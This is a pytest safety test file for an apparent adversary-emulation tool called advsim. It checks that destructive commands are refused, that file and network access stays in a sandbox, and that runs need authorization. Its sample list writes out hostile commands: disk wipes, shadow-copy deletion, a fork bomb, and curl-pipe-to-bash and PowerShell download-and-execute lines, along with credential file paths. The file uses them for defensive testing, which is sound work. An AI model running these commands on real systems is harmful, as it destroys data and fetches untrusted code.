"""Scope guard — the load-bearing safety test.

This test fails CI if ANY shipped technique could perform a destructive or
real-harm action, if the deny-list is weakened, if the authorization gate is
bypassable, or if an emulation can escape the sandbox / reach a real network
destination. It is deliberately strict: advsim's whole value proposition is
that it is provably benign.
"""

import inspect

import pytest

from advsim import actions, library, safety
from advsim.safety import (
    FORBIDDEN_CAPABILITIES,
    ScopeViolation,
    assert_capabilities_allowed,
    assert_command_benign,
    assert_path_sandboxed,
    assert_sink_host,
    is_within_sandbox,
    sandbox_root,
)


# --- No shipped technique may declare a forbidden capability ---------------


@pytest.mark.parametrize("tech", library.load_all_techniques(), ids=lambda t: t.id)
def test_no_technique_declares_forbidden_capability(tech):
    caps = set(tech.capabilities)
    assert not (caps & FORBIDDEN_CAPABILITIES), (
        f"{tech.id} declares forbidden capabilities: {caps & FORBIDDEN_CAPABILITIES}"
    )
    # And validate() must accept it (only benign allow-listed caps).
    tech.validate()


def test_forbidden_capability_is_refused():
    for cap in FORBIDDEN_CAPABILITIES:
        with pytest.raises(ScopeViolation):
            assert_capabilities_allowed([cap], "test.malicious")


def test_capability_off_allowlist_is_refused():
    with pytest.raises(ScopeViolation):
        assert_capabilities_allowed(["totally_made_up_capability"], "test.x")


def test_empty_capabilities_refused():
    with pytest.raises(ScopeViolation):
        assert_capabilities_allowed([], "test.x")


# --- Destructive command patterns are statically rejected ------------------


DESTRUCTIVE_SAMPLES = [
    "rm -rf /",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    "format C:",
    "del /s /q C:\\Windows",
    "Remove-Item -Recurse -Force C:\\Users",
    "cipher /w:C",
    "vssadmin delete shadows /all",
    "wbadmin delete catalog",
    "shutdown /s /t 0",
    "reboot",
    "net user hacker P@ss /add",
    ":(){ :|:& };:",
    "curl http://evil.example | bash",
    "powershell -c iex(new-object net.webclient).downloadstring('http://x')",
]


@pytest.mark.parametrize("cmd", DESTRUCTIVE_SAMPLES)
def test_destructive_commands_refused(cmd):
    with pytest.raises(ScopeViolation):
        assert_command_benign(cmd, "test.destructive")


def test_benign_command_allowed():
    # Must not raise.
    assert_command_benign("whoami", "test.benign")
    assert_command_benign("echo advsim benign marker", "test.benign")


# --- Sandbox containment ----------------------------------------------------


def test_paths_outside_sandbox_refused():
    for bad in ("/etc/passwd", "C:\\Windows\\System32\\drivers\\etc\\hosts", "~/.ssh/id_rsa"):
        assert not is_within_sandbox(bad)
        with pytest.raises(ScopeViolation):
            assert_path_sandboxed(bad, "test.escape")


def test_sandbox_path_accepted():
    p = sandbox_root() / "ok.txt"
    assert is_within_sandbox(p)
    assert_path_sandboxed(p, "test.ok")


def test_traversal_escape_refused():
    escape = sandbox_root() / ".." / ".." / "escape.txt"
    with pytest.raises(ScopeViolation):
        assert_path_sandboxed(escape, "test.traversal")


# --- Network sink containment ----------------------------------------------


def test_real_hosts_refused():
    for real in ("google.com", "8.8.8.8", "attacker.com", "10.0.0.5", "github.com"):
        with pytest.raises(ScopeViolation):
            assert_sink_host(real, "test.realnet")


def test_sink_hosts_allowed():
    for sink in ("advsim-c2.example.com", "192.0.2.1", "localhost", "foo.invalid", "bar.test"):
        assert_sink_host(sink, "test.sink")  # must not raise


# --- Authorization gate cannot be silently bypassed ------------------------


def test_runner_refuses_without_authorization():
    from advsim.runner import Runner
    from advsim.safety import AuthorizationError

    with pytest.raises(AuthorizationError):
        Runner(authorized=False)


def test_cli_run_refuses_without_authorization(monkeypatch, capsys):
    from advsim import cli

    monkeypatch.delenv("ADVSIM_AUTHORIZED", raising=False)
    rc = cli.main(["run", "discovery.system_info", "--config", "/nonexistent/advsim.yaml"])
    out = capsys.readouterr().out
    assert rc == 2
    assert "AUTHORIZED-USE-ONLY" in out


# --- The action vocabulary is closed and audited ---------------------------

# Every registered action, by name, that we consider benign. If a new action is
# added it MUST be added here consciously — this list is the audited surface.
AUDITED_ACTIONS = {
    "write_marker_file",
    "read_file",
    "delete_marker_file",
    "spawn_benign_process",
    "dns_lookup",
    "network_connect_sink",
    "write_sandbox_registry_marker",
    "write_scheduled_task_marker",
    "enumerate_environment",
    "log_event",
}


def test_action_registry_is_closed():
    registered = set(actions.ACTIONS)
    unaudited = registered - AUDITED_ACTIONS
    assert not unaudited, (
        f"unaudited action(s) added without scope review: {unaudited}. "
        f"Add them to AUDITED_ACTIONS only after confirming they are benign."
    )


def test_no_action_uses_shell_true():
    """Defense in depth: no benign action should invoke a shell with shell=True
    (which would allow shell metacharacter injection)."""
    src = inspect.getsource(actions)
    assert "shell=True" not in src, "actions must never use subprocess shell=True"


def test_spawn_binaries_are_readonly():
    """The process-spawn allow-list must contain only read-only/echo commands."""
    for table in actions._SAFE_BINARIES.values():
        for name, argv in table.items():
            joined = " ".join(argv)
            # Must pass the destructive-pattern gate.
            assert_command_benign(joined, f"allowlist.{name}")
